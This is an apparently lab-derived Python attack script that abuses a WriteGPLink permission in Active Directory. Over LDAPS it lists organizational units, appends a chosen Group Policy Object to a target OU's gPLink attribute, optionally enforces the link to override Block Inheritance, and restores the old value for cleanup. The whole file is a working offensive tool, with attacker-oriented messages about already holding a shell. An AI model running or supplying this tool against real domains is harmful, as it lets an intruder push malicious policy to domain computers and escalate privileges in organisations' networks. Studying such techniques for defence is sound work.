#!/usr/bin/env python3
"""
link_gpo.py - Set gPLink on a target OU to link a GPO.
              This is the WriteGPLink abuse step.

Usage:
  python3 link_gpo.py -u coby -p 'Password01' -d woke.local -dc 192.168.100.67 --list-ous
  python3 link_gpo.py -u coby -p 'Password01' -d woke.local -dc 192.168.100.67 --gpo-guid "{GUID}" --target-ou "OU=CoolComputers,DC=woke,DC=local"
  python3 link_gpo.py -u coby -p 'Password01' -d woke.local -dc 192.168.100.67 --gpo-guid "{GUID}" --target-ou "OU=..." --enforced
  python3 link_gpo.py -u coby -p 'Password01' -d woke.local -dc 192.168.100.67 --restore --target-ou "OU=..." --original-gplink "<saved value>"

Link flags in gPLink:
  ;0 = Enabled, not enforced
  ;1 = Disabled
  ;2 = Enabled, ENFORCED  (overrides Block Inheritance on child OUs)
"""

import sys
import argparse
from ldap3 import Server, Connection, NTLM, ALL, MODIFY_REPLACE, BASE, SUBTREE, Tls
import ssl


def connect(dc_ip, domain, username, password):
    bind_user = f"{domain}\\{username}"
    tls = Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLS_CLIENT)
    srv = Server(dc_ip, port=636, use_ssl=True, tls=tls, get_info=ALL)
    conn = Connection(srv, user=bind_user, password=password,
                      authentication=NTLM, auto_bind=True)
    print(f"[+] Bound as {bind_user} (LDAPS)")
    return conn


def domain_to_base_dn(domain):
    """Convert domain like woke.local to DC=woke,DC=local"""
    return ",".join(f"DC={part}" for part in domain.split("."))


def make_gplink_value(gpo_guid, base_dn, enforced=False):
    guid_str = gpo_guid.upper()
    if not guid_str.startswith("{"):
        guid_str = "{" + guid_str + "}"
    flag = 2 if enforced else 0
    return f"[LDAP://CN={guid_str},CN=Policies,CN=System,{base_dn};{flag}]"


def list_ous(conn, base_dn):
    conn.search(base_dn, "(objectClass=organizationalUnit)", SUBTREE,
                attributes=["distinguishedName", "name", "gPLink", "gPOptions"])
    print("\n[*] OUs and current gPLink values:")
    for e in conn.entries:
        gplink = str(e.gPLink) if e.gPLink else "(none)"
        opts = str(e.gPOptions) if e.gPOptions else "0"
        blocked = "  [!] Block Inheritance" if opts == "1" else ""
        print(f"  {e.name}")
        print(f"    DN     : {e.distinguishedName}")
        print(f"    gPLink : {gplink}")
        print(f"    gPOpts : {opts}{blocked}")
        print()


def get_existing_gplink(conn, ou_dn):
    conn.search(ou_dn, "(objectClass=*)", BASE, attributes=["gPLink"])
    if conn.entries and conn.entries[0].gPLink:
        return str(conn.entries[0].gPLink)
    return None


def link_gpo(conn, gpo_guid, target_ou, base_dn, enforced=False):
    gplink_val = make_gplink_value(gpo_guid, base_dn, enforced)
    existing = get_existing_gplink(conn, target_ou)

    if existing and existing.strip():
        print(f"[*] OU already has gPLink: {existing}")
        print(f"[*] Appending our GPO (preserving existing links)")
        new_val = existing.rstrip() + gplink_val
    else:
        new_val = gplink_val

    print(f"\n[*] Target OU  : {target_ou}")
    print(f"[*] GPLink val : {new_val}")
    print(f"[*] Enforced   : {enforced}")

    result = conn.modify(target_ou, {"gPLink": [(MODIFY_REPLACE, [new_val])]})

    if result:
        print(f"\n[+] gPLink set successfully!")
        print(f"[!] SAVE THIS for cleanup: --original-gplink \"{existing or ''}\"")
        print(f"\n[*] GP applies on next refresh cycle (~90 min default) or")
        print(f"    gpupdate /force if you already have a shell")
    else:
        desc = conn.result.get("description", "")
        code = conn.result.get("result", -1)
        print(f"\n[-] Failed: {desc} (code {code})")
        if code == 50:
            print("[!] Insufficient access — verify WriteGPLink ACE is on this exact OU DN")
        return False

    return True


def restore_gplink(conn, target_ou, original_value):
    if original_value:
        result = conn.modify(target_ou, {"gPLink": [(MODIFY_REPLACE, [original_value])]})
    else:
        result = conn.modify(target_ou, {"gPLink": [(MODIFY_REPLACE, [])]})
    if result:
        print(f"[+] gPLink restored on {target_ou}")
    else:
        print(f"[-] Restore failed: {conn.result.get('description', '')}")


if __name__ == "__main__":
    p = argparse.ArgumentParser(
        description="Link GPO to OU via WriteGPLink",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  %(prog)s -u coby -p 'Pass' -d woke.local -dc 192.168.100.67 --list-ous
  %(prog)s -u coby -p 'Pass' -d woke.local -dc 192.168.100.67 --gpo-guid "{GUID}" --target-ou "OU=CoolComputers,DC=woke,DC=local"
  %(prog)s -u coby -p 'Pass' -d woke.local -dc 192.168.100.67 --restore --target-ou "OU=..." --original-gplink "<value>"
        """,
    )

    # Auth args
    p.add_argument("-u", "--username", required=True, help="Domain username")
    p.add_argument("-p", "--password", required=True, help="Password")
    p.add_argument("-d", "--domain", required=True, help="Domain (e.g., woke.local)")
    p.add_argument("-dc-ip", required=True, dest="dc_ip", help="Domain controller IP")

    # Action args
    p.add_argument("--gpo-guid", default=None, help="GPO GUID to link")
    p.add_argument("--target-ou", default=None, help="Target OU distinguished name")
    p.add_argument("--enforced", action="store_true",
                   help="Flag ;2 — overrides Block Inheritance")
    p.add_argument("--list-ous", action="store_true", help="List all OUs and their gPLink values")
    p.add_argument("--restore", action="store_true", help="Restore original gPLink value")
    p.add_argument("--original-gplink", default="",
                   help="Saved gPLink value to restore")

    args = p.parse_args()

    base_dn = domain_to_base_dn(args.domain)
    conn = connect(args.dc_ip, args.domain, args.username, args.password)

    if args.list_ous:
        list_ous(conn, base_dn)
        sys.exit(0)

    if not args.target_ou:
        print("[-] --target-ou required")
        sys.exit(1)

    if args.restore:
        restore_gplink(conn, args.target_ou, args.original_gplink)
        sys.exit(0)

    if not args.gpo_guid:
        print("[-] --gpo-guid required")
        sys.exit(1)

    link_gpo(conn, args.gpo_guid, args.target_ou, base_dn, enforced=args.enforced)
